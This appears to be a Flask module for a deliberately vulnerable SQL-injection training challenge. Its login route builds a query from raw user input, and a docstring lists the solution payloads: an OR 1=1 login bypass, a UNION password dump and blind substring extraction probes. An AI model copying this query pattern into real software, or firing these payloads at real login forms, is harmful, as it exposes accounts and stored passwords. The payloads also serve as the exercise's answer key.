#!/usr/bin/python3
from functools import wraps
from flask import (
    render_template,
    Blueprint,
    current_app,
    redirect,
    url_for,
    session,
    request,
    flash
)
from sqli_platform import app, clog, db
from sqli_platform.utils.challenge import (
    get_flag,
    get_config,
    format_query
)

"""
Flag1 - Login as admin
Bypass login:
' OR 1=1--

Flag2 - From password dump?
Dump passwords:
' UNION SELECT 1,group_concat(password) from users--

New challenge: Make it blind so the user must build a script to get the password
' UNION SELECT 1,(SELECT hex(substr(password,3,1)) from users limit 1)--


SELECT id, username FROM users WHERE username = '-1747' OR SUBSTR((SELECT COALESCE(CAST(sql AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE tbl_name=CAST(X'7573657273' AS TEXT) LIMIT 1),113,1)>CAST(X'01' AS TEXT)--

"""

_bp = "challenge3"
challenge3 = Blueprint(_bp , __name__, template_folder='templates', url_prefix=f"/{_bp}")
_templ = "challenges/challenge1"
_query = []

@challenge3.context_processor
def sessions():
    """
    
    """
    global _query
    d = dict(
        cname=_bp,
        csession = session.get(f"{_bp}_user_id", None),
        csession_name=session.get(f"{_bp}_username", None),
        ctitle=get_config(f"{_bp}", "title"),
        query=format_query(_query),
        slides="challenge1/slides/slides.html"
    )
    _query = []
    return d


def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if session.get(f"{_bp}_user_id", None) is None:
            return redirect(url_for(f"{_bp}.login", next=request.url))
        return f(*args, **kwargs)
    return decorated_function

@challenge3.route("/")
@challenge3.route("/login", methods=["GET", "POST"])
def login():
    global _query

    if request.method == "POST":
        username = request.form["username"].lower()
        password = request.form["password"]

        if not (username and password):
            flash("Username or Password cannot be empty.", "warning")
            return redirect(url_for(f"{_bp}.login"))
        
        query = f"SELECT id, username FROM users WHERE username = '{username}' AND password = '{password}'"
        _query.append(query)
        user = db.sql_query(_bp, query, one=True)
        
        if user:
            # Get clean data, decoding the cookie is not a part of this challenge
            clean = f"SELECT id, username FROM users WHERE username = ? AND password = ?"
            clean_data = db.sql_query(_bp, clean, [username, password], one=True)

            session[f"{_bp}_user_id"] = clean_data["id"] if clean_data else 1
            session[f"{_bp}_username"] = clean_data["username"] if clean_data else "Unkown"
            clog.debug(f"{_bp} login: Session: {session[f'{_bp}_user_id']}")
            return redirect(url_for(f"{_bp}.home"))
        else:
            flash("Invalid username or password.", "danger")
    return render_template(f"{_templ}/login.html", slide_num=0)


@challenge3.route("/signup", methods=["GET", "POST"])
def signup():
    global _query

    if request.method == "POST":
        username = request.form["username"].lower()
        password = request.form["password"]

        if not (username and password):
            flash("Username or Password cannot be empty.")
            return redirect(url_for(f"{_bp}.signup"))

        # No error checking etc...
        query = "SELECT username FROM users WHERE username=?"
        _query.append((query, [username]))
        if db.sql_query(_bp, query, [username]):
            flash("Username already exists.", "danger")
        else:
            query = "INSERT INTO users (username, password) VALUES (?, ?)"
            params = [username, password]
            _query.append((query, params))
            db.sql_insert(_bp, query, params)
            return redirect(url_for(f"{_bp}.login"))
    return render_template(f"{_templ}/registration.html")


@challenge3.route("/home")
@login_required
def home():
    return render_template(f"{_bp}/index.html")


@challenge3.route("/notes", methods=["GET", "POST"])
@login_required
def notes():
    flash("Not Implemented ", "warning")
    return render_template(f"{_templ}/notes.html")


@challenge3.route("/changepwd", methods=["GET", "POST"])
@login_required
def changepwd():
    flash("Not Implemented ", "warning")
    return render_template(f"{_templ}/updatepwd.html")


@challenge3.route("/logout")
def logout():
    session.clear()
    return redirect(url_for(f"{_bp}.login"))

